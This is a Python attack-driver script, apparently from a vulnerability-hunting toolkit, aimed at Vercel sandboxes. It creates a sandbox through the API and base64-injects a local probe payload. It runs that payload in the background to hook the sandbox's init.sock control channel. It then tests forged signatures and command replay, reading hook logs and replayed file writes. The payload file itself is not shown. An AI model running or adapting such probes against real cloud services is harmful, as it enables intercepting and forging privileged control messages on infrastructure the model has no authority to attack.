# -*- coding: utf-8 -*-
"""v208 驱动: init.sock hook + 签名覆盖范围测试 (A-args/B-id/C-newts/D-fakesig)"""
import sys, os, time, base64
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ, fresh_sandbox, cmd

NAME = 'v208'
PAY = r'D:\scan\skills\non-traditional-vuln-hunting\vda208_probe_user.py'


def inject(sid, dst, content):
    b64 = base64.b64encode(content if isinstance(content, bytes) else content.encode()).decode()
    s = "import base64;open('%s','wb').write(base64.b64decode('%s'))" % (dst, b64)
    c, r = cmd(sid, 'python3', ['-c', s], 60000)
    print('[inject %s]' % dst, c)
    return c


def main():
    t0 = time.time()
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    sid = fresh_sandbox(NAME)
    print('[create ok] %.0fs' % (time.time() - t0))

    inject(sid, '/vercel/sandbox/vda208_probe_user.py', open(PAY, 'rb').read())

    c, r = cmd(sid, 'bash', ['-c', 'nohup python3 /vercel/sandbox/vda208_probe_user.py > /vercel/sandbox/v208out.log 2>&1 &'], 20000)
    print('[bg payload]', c, (r or '')[:300])
    time.sleep(5)

    # 触发 bash -c echo v208-mark (捕获 bash 命令请求)
    c, r = cmd(sid, 'bash', ['-c', 'echo v208-mark'], 30000)
    print('[trigger1 bash echo]', c, (r or '')[:500])
    time.sleep(3)
    c, r = cmd(sid, 'echo', ['post-trigger'], 30000)
    print('[trigger2 echo]', c, (r or '')[:500])

    time.sleep(52)
    c, r = cmd(sid, 'cat', ['/vercel/sandbox/v208hook.log'], 30000)
    print('[hook log]', c)
    print((r or '')[:25000])
    c, r = cmd(sid, 'cat', ['/vercel/sandbox/v208out.log'], 20000)
    print('[out log]', c)
    print((r or '')[:4000])

    # 验证重放写文件效果
    c, r = cmd(sid, 'bash', ['-c', 'ls -la /tmp/v208_a /tmp/v208_id 2>&1; cat /tmp/v208_a /tmp/v208_id 2>&1'], 20000)
    print('[replay effect]', c)
    print((r or '')[:2000])

    c, r = cmd(sid, 'echo', ['post-restore-ok'], 30000)
    print('[post-restore]', c, (r or '')[:300])

    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    print('CLEANED total %.0fs' % (time.time() - t0))


if __name__ == '__main__':
    main()
